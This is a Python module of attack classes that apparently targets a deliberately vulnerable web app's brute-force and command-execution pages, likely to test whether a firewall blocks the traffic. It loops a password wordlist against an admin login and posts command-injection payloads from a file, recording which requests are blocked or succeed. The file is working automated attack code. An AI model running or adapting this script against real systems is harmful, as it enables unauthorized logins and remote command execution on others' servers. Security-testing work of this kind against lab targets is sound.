from attacks.baseClass import AttackSession
from pathlib import Path
from utilities.eventHandler import eventHandler

class IRA(AttackSession):
    def __init__(self, host, authenticationPath, authPayload):
        super().__init__(host, authenticationPath, authPayload)

    def authentication(self):
        return super().authentication()
    def attack():
        pass
    def startAttack(self):
        bruteForce(self.host,self.authenticationPath, self.authPayload).startAttack()
        commandInjection(self.host,self.authenticationPath, self.authPayload).startAttack()

 

class bruteForce(AttackSession):
    events = eventHandler()
    events.connect(events.callback,sender="Brute Force")
    def __init__(self, host, authenticationPath, authPayload):
        super().__init__(host, authenticationPath, authPayload)
    
    def authentication(self):
        return super().authentication()
    
    def attack(self,session):
        base_path = Path(__file__)
        file_path = (base_path / "../../payloads/fasttrack.txt").resolve()
        with open(file_path,mode='r',encoding="ISO-8859-1") as f:
            while line := f.readline():
                url = self.host + "vulnerabilities/brute/index.php?username=admin&password="+line.strip()+"&Login=Login#"
                try:
                    response = session.get(url)
                    if response.status_code == 403:
                        self.events.sendMessage("Blocked","Brute Force",line.strip())
                    elif response.status_code == 200:
                        self.events.sendMessage("Successful","Brute Force",line.strip())
                    self.events.sendMessage("Response Time","Brute Force",response.elapsed.total_seconds())
                except:
                    self.events.sendMessage("Error","Brute Force","Error on server")
                
        f.close()
    def startAttack(self):
        self.events.sendMessage("Information","Brute Force","Attack started")
        self.attack(self.authentication())
        self.events.sendMessage("Information","Brute Force","Attack completed")
        self.events.disconnect(self.events.callback,sender="Brute Force")


class commandInjection(AttackSession):
    events = eventHandler()
    events.connect(events.callback,sender="Command Injection")
    def __init__(self, host, authenticationPath, authPayload):
        super().__init__(host, authenticationPath, authPayload)
    
    def authentication(self):
        return super().authentication()
    
    def attack(self,session):
        base_path = Path(__file__)
        file_path = (base_path / "../../payloads/commandinjection.txt").resolve()
        with open(file_path,mode='r',encoding="ISO-8859-1") as f:
            while line := f.readline():
                url =  self.host + "vulnerabilities/exec/index.php"
                try:
                    response = session.post(url,data="ip="+line.strip())
                    if response.status_code == 403:
                        self.events.sendMessage("Blocked","Command Injection",line.strip())
                    elif response.status_code == 200:
                        self.events.sendMessage("Successful","Command Injection",line.strip())
                    self.events.sendMessage("Response Time","Command Injection",response.elapsed.total_seconds())
                    
                except:
                    self.events.sendMessage("Error","Command Injection","Error on server")
        f.close()
    def startAttack(self):
        self.events.sendMessage("Information","Command Injection","Attack started")
        self.attack(self.authentication())
        self.events.sendMessage("Information","Command Injection","Attack completed")
        self.events.disconnect(self.events.callback,sender="Command Injection")
